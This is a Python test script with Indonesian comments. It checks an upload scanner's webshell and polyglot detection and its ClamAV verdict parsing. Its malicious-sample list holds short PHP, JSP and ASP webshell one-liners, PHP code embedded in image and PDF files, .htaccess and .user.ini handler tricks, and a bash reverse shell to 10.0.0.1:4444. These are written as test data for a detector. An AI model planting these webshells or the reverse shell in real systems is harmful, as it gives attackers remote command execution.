#!/usr/bin/env python3
# Uji heuristik webshell/backdoor/polyglot dan penguraian clamd pada sentinel-upload-scan.py (offline, tanpa daemon).
# Pemakaian: upload_heuristic_test.py <path sentinel-upload-scan.py>
import sys, os, importlib.util
spec = importlib.util.spec_from_file_location('u', sys.argv[1]); u = importlib.util.module_from_spec(spec); spec.loader.exec_module(u)
gagal = 0
def T(n, k, i=''):
    global gagal
    print('  %s %s%s' % ('LULUS' if k else 'GAGAL', n, '' if k else '  -> ' + str(i)[:200]))
    if not k: gagal += 1
H = u.heuristic_scan
JAHAT = [('a.php', b'<?php @eval($_POST["x"]);?>'), ('a.php', b'<?php system($_GET["c"]);?>'),
         ('a.phtml', b'<?php eval(base64_decode("QQ=="));?>'), ('a.php5', b"<?php preg_replace('/x/e', $_POST[1], 'x');?>"),
         ('a.php', b'<?php $_POST["f"]($_POST["a"]);?>'), ('a.php', b'<?php include($_GET["f"]);?>'),
         ('a.php', b'<?php echo `$_GET[c]`;?>'), ('a.php', b'<?php $f=$_POST[1]; eval($f($_POST[2]));?>'),
         ('a.php', b'<?php /* c99shell */ ?>'), ('a.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>'),
         ('a.asp', b'<% eval request("x") %>'), ('a.asp', b'<% execute(request("x")) %>'),
         ('a.sh', b'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'), ('a.php.jpg', b'<?php eval($_POST[1]);?>')]
for n, d in JAHAT:
    T('jahat terdeteksi: %s %s' % (n, d[:34].decode('latin1')), H(n, d, b'', True) is not None)
for n, d in [('x.gif', b'GIF89a<?php system($_GET[1]);?>'), ('x.jpg', b'\xff\xd8' + os.urandom(100) + b'<?= $_GET[c] ?>'),
             ('x.png', b'\x89PNG' + b'<script language="php">1</script>'), ('x.pdf', b'%PDF <?php @assert($_REQUEST[1]);?>')]:
    T('polyglot media terdeteksi: ' + n, H(n, d, b'', True) is not None)
T('tail media (di luar kepala) terdeteksi', H('x.jpg', b'\xff\xd8abc', b'<?php eval($_POST[1]);?>', True) is not None)
T('.htaccess pengubah handler PHP (folder upload)', H('.htaccess', b'AddType application/x-httpd-php .jpg', b'', True) is not None)
T('.htaccess yang sama di akar situs (non-strict) TIDAK dihentikan (sah pada aplikasi)', H('.htaccess', b'AddHandler application/x-httpd-php82 .php', b'', False) is None)
T('.user.ini auto_prepend_file (folder upload)', H('.user.ini', b'auto_prepend_file=/tmp/x.php', b'', True) is not None)
SAH = [('a.php', b'<?php echo "halo"; ?>'), ('a.php', b'<?php class A { function f($x){ return strtoupper($x); } } ?>'),
       ('a.txt', b'ada kata eval dan system'), ('x.jpg', b'\xff\xd8' + b'\x00' * 100), ('x.pdf', b'%PDF-1.4 obj'),
       ('.htaccess', b'Options -Indexes\nphp_flag engine off'), ('x.png', b'<?xml version="1.0"?>'), ('x.jpg', b'<?= $a ?>')]
for n, d in SAH:
    T('sah tidak dicurigai: %s %s' % (n, d[:30].decode('latin1')), H(n, d, b'', True) is None)
for kb in (20, 500, 4096):
    N = 300
    hit = sum(1 for _ in range(N) if H('foto.jpg', os.urandom(kb * 1024), b'', True))
    T('data acak %d KB sebagai gambar: %d dari %d positif palsu' % (kb, hit, N), hit == 0)
T('putusan clamd: FOUND', u._putusan_clamd('fd[7]: Eicar-Test-Signature FOUND') == ('INFECTED', 'Eicar-Test-Signature'))
T('putusan clamd: OK', u._putusan_clamd('stream: OK') == ('CLEAN', 'Clean'))
T('putusan clamd: ERROR (batas INSTREAM)', u._putusan_clamd('INSTREAM size limit exceeded. ERROR')[0] == 'ERROR')
T('putusan clamd: kosong = ERROR', u._putusan_clamd('')[0] == 'ERROR')
print('\nRINGKAS: %d gagal' % gagal); sys.exit(1 if gagal else 0)
